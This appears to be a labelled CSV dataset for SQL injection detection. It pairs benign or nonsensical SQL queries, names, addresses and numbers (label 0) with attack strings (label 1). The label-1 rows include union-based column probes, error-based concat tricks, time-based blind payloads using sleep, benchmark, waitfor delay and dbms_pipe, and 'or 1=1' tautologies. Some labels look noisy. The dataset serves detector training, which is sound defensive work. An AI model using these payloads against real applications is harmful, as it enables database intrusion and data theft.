Query,Label
"1  )   where 5232  =  5232 union all select null,null,null#",1
"1   )    )    as wezj where 2869  =  2869 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT bush ( s )  FROM weigh UNION,0
 UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth',0
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """,1
itter,0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1
francois,0
"SELECT ID, post_title, post_name FROM wp_posts WHERE post_type  =  'wpcf7_contact_form'",0
" SELECT * FROM usually ORDER BY game, nest",0
" SELECT CustomerName, CONCAT ( Address,', ',PostalCode,', ',City,', ',Country )  AS Address FROM Customers;",0
 or 1 --',1
" select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",1
55912738z,0
SELECT AVG ( equal ) FROM our,0
SELECT MIN ( tide )  AS thumb FROM straight,0
1'+  (  select iwbs where 4939  =  4939,1
SELECT * FROM store FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM nuts,0
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  9932  =  9932,1
SELECT * FROM needle WHERE fog IN  ( SELECT darkness FROM appearance ) ,0
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-7404' where 1536  =  1536 order by 1#,1
1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,1
SELECT * FROM create,0
select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --,1
"passeig de monjo 102, 11?a",0
lieneman,0
"1%""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,1
"  SELECT factor,tightly FROM log WHERE make = 'roar' UNION SELECT salt, heading FROM most",0
hi' or 1  =  1 --,1
"-3817""  )   as vugz where 3064  =  3064 or 9323  =  9323#",1
SELECT COUNT ( completeID ) FROM ill,0
calle panaderas de san cecilio 168,0
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",1
6424,0
bebedizo,0
"INSERT INTO prove ( hand, remain, teacher, chance, getting, experience )  VALUES  ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )  ",0
carlos tomas romero 130,0
"  SELECT * FROM out WHERE equator NOT IN  ( 'pictured', 'visit', 'by' )  ",0
"-8588' union all select 2135,2135--",1
"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",1
SELECT AVG ( blank ) FROM thread,0
SELECT difference,0
SELECT MIN ( repeat )  AS chemical FROM rain,0
3.60E+15,0
"1""   )    )    as sqow where 8752  =  8752",1
-5268'  )   where 5615  =  5615 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
FROM  ( SELECT DISTINCT stopped FROM capital ) ,0
SELECT * FROM national WHERE salt NOT LIKE '[bite]%',0
orazio,0
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",1
"1' union all select null,null,null,null,null,null,null,null--",1
9491,0
"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1'||  (  select 'hafu' where 6226  =  6226,1
SELECT AVG ( Price ) FROM task,0
"c/ jose belso castao, s/n,",0
-7951'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'blak'  =  'blak,1
SELECT AVG ( well ) FROM drop SELECT SUM ( statement ) ,0
" SELECT * FROM frozen ORDER BY over, former",0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",1
"1,iif  (  6333  =  1227,1,1/0  )  ",1
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1
sineiro herranz,0
SELECT * FROM  ( SELECT minute FROM lake ) ,0
-8615   )    )     )   or 4039  =  9144,1
"   SELECT herself,familiar,excellent,proud,volume     (  (  believed JOIN rate ON character.count =  bound.ride )   INNER JOIN clothesON Orders.valley =  throat.westernID ) ",0
"INSERT INTO powder  ( tonight, supper, larger )  VALUES  ( 'minute', 'spirit', 'characteristic' )  ",0
handler,1
"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT * FROM mass WHERE mental NOT LIKE '[mysterious]%',0
"  SELECT * FROM change WHERE newspaper IN  ( 'caught', 'ahead', 'pie' )  ",0
SELECT * FROM under FETCH FIRST 3 ROWS ONLY,0
matungo,0
SELECT TOP 50 PERCENT * FROM atom,0
51285362p,0
SELECT thumb FROM captured UNION SELECT shoot FROM red ORDER BY current,0
ferrandez cabaas,0
select case when 5308  =  6745 then 1 else null end--,1
SELECT TOP 3 * FROM pet WHERE talk = 'face',0
having,1
orzuelo,0
SELECT DISTINCT spoken FROM tribe,0
"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1
"  SELECT * FROM class WHERE add IN  ( 'swimming', 'stairs', 'consider' )  ",0
tenuta,0
SELECT * FROM carry WHERE walk = 'body' LIMIT 3,0
a2152,0
SELECT everywhere ( s )  FROM western FULL OUTER JOIN,0
select * from users where id  =  1 <@ or 1  =  1 -- 1,1
"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",1
SELECT master FROM jack,0
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'xdui' like 'xdui",1
SELECT * FROM grow WHERE three LIKE '%require%',0
SELECT * FROM breath FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'  )   union all select null,null,null#",1
"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",1
"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
vadim,0
SELECT TOP 50 PERCENT * FROM flame SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gun,0
" SELECT * FROM floor ORDER BY useful, general",0
SELECT surprise ( s ) FROM examine INNER JOIN,0
5154,0
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
tracz,0
1 where 3744  =  3744,1
SELECT AVG ( Price ) FROM man,0
"  SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID",0
"1%"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"camio da mina, 175,",0
"  SELECT got,author FROM might WHERE sand = 'journey' UNION SELECT including, hard FROM letter",0
bevis,0
SELECT * FROM refused,0
"-7007  )   union all select 6704,6704--",1
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
abia de la obispala,0
"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",1
"o rio, 134,",0
SELECT * FROM east WHERE tropical BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT picture FROM vowel UNION SELECT plus FROM necessary ORDER BY coming,0
SELECT TOP 50 PERCENT * FROM terrible SELECT * FROM film FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM view,0
canaan,0
SELECT COUNT ( DISTINCT complete )  FROM wish,0
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,1
SELECT * FROM fifth WHERE essential = 'well',0
select   (  case when   (  5418  =  6516  )   then 1 else 5418*  (  select 5418 from master..sysdatabases  )   end  )  --,1
SELECT * FROM  ( SELECT compare FROM private ) ,0
1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,1
31049,0
hinkie@goovitae.pg,0
hus24lero,0
"SELECT * FROM of WHERE family BETWEEN ""boat"" AND    ""boat""",0
SELECT TOP 50 PERCENT * FROM our,0
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",1
36lis8r,0
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1,0
SELECT * FROM report,0
"  SELECT alike,tell,pile FROM usually LEFT JOIN Orders ON yesterday.silkID =  feet.zero ORDER BY steady.hill",0
" SELECT * FROM student ORDER BY party, golden",0
SELECT least ( s ) FROM again INNER JOIN,0
SELECT swimming FROM explore UNION SELECT therefore FROM hungry ORDER BY base,0
SELECT DISTINCT hang FROM sudden,0
SELECT AVG ( rubber )  FROM prize  SELECT SUM ( court ) ,0
dinaband,0
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%',0
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'acdu'  =  'acdu",1
SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY;SELECT TOP 3 * FROM Customers,0
9.26768E+15,0
"1%""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM city FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM seed WHERE section = 'build' FETCH FIRST 3 ROWS ONLY,0
"-6263"" union all select 8005,8005#",1
SELECT EXP ( 2 ) ;,0
8695,0
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'akki'  =  'akki",1
"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",1
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",1
SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM enjoy WHERE studying NOT LIKE '[bell]%',0
SELECT man ( s )  FROM lunch SELECT breathe ( s ) ,0
SELECT COUNT ( mind ) FROM dog,0
themselves-ignez@powerthink.cx,0
" SELECT * FROM being ORDER BY said ASC, coal DESC",0
SELECT AVG ( Price ) FROM day,0
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1
SELECT COUNT ( action )  FROM title,0
bacio bonnin,0
SELECT * FROM  ( SELECT flew FROM essential ) ,0
DELETE FROM section WHERE underline = 'shoot',0
SELECT nearby ( s )  FROM thumb UNION,0
"INSERT INTO slow  ( wagon, home, rope )  VALUES  ( 'never', 'bag', 'liquid' )  ",0
siomara,0
SELECT * FROM  ( SELECT dance FROM grain ) ,0
SELECT case ( s )  FROM whom LEFT JOIN,0
"calle platerias, 47",0
"1""  )   where 6964  =  6964",1
-2291   )    )    or 4067  =  5666#,1
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
1  )   as bzuh where 8041  =  8041 and 6307  =  9200#,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",1
46726,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367532 ) ,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262310,262326,262328 )  ORDER BY meta_id ASC",0
"-9572%""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
"1   )    )     )   union all select null,null,null#",1
SELECT * FROM behavior WHERE uncle NOT LIKE 'ruler%',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13506 )  ORDER BY meta_id ASC",0
h46a00o,0
1'  )   as tsge where 6970  =  6970,1
benzo,0
43896,0
"-1425""  )   where 8056  =  8056 or elt  (  1032  =  1032,3623  )  --",1
SELECT AVG ( feel ) FROM lion,0
"1""  )   as uorp where 7208  =  7208",1
SELECT AVG ( thick )  FROM hall  SELECT SUM ( shaking ) ,0
SELECT * FROM rhyme WHERE sink IN  ( SELECT furniture FROM our ) ,0
"   SELECT Employees.phrase, COUNT ( Orders.halfwayID )  AS roadFROM    ( OrdersINNER JOIN wonderful ON Orders.productID  =  Employees.girlID ) ",0
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT COUNT ( your ) FROM while,0
SELECT TOP 3 * FROM wrong WHERE bar = 'afraid',0
SELECT * FROM pretty WHERE    NOT combination = 'horn',0
"1  )   union all select null,null,null,null,null,null,null,null,null#",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",1
4.29127E+15,0
waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",1
"select * from generate_series  (  7754,7754,case when   (  7754  =  1252  )   then 1 else 0 end  )   limit 1--",1
"1'||  (  select 'tmsj' where 2971  =  2971 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM depend  WHERE escape = mice,0
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,1
SELECT camera ( s )  FROM test,0
"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",1
select   (  case when   (  8294  =  4332  )   then 1 else 8294*  (  select 8294 from master..sysdatabases  )   end  )  --,1
select * from users where id  =  1.*1 or 1  =  1 -- 1,1
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",1
1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1
SELECT * FROM do WHERE moment = 'beneath',0
 UPDATE atmosphere SET quiet = 'chart'WHERE movie = 'speech',0
"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
"iif  (  1149  =  4765,1,1/0  )  ",1
"  SELECT GREATEST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0
select   (  case when   (  1005  =  5996  )   then 1 else 1005*  (  select 1005 from master..sysdatabases  )   end  )  --,1
"-4031""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""auhn""  =  ""auhn",1
"1,  (  select   (  case when   (  3743  =  9640  )   then 1 else 3743*  (  select 3743 from master..sysdatabases  )   end   )    )   ",1
SELECT * FROM clearly ORDER BY planning,0
-4542'   )    )    order by 1#,1
SELECT MIN ( symbol )  AS while FROM hurried,0
SELECT * FROM bicycle WHERE ten = 'road',0
SELECT worker ( s )  FROM outline SELECT pale FROM power,0
 UPDATE serve SET official = 'colony'WHERE labor = 'dark',0
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1
bruscamente,0
SELECT * FROM rise,0
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
1 where 5700  =  5700,1
SELECT COUNT ( saved ) FROM wherever,0
"-8301'  )   union all select 1806,1806--",1
SELECT * FROM  ( SELECT motion FROM sum ) ,0
SELECT knowledge ( s )  FROM longer SELECT create ( s ) ,0
holness,0
SELECT * FROM roof FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,0
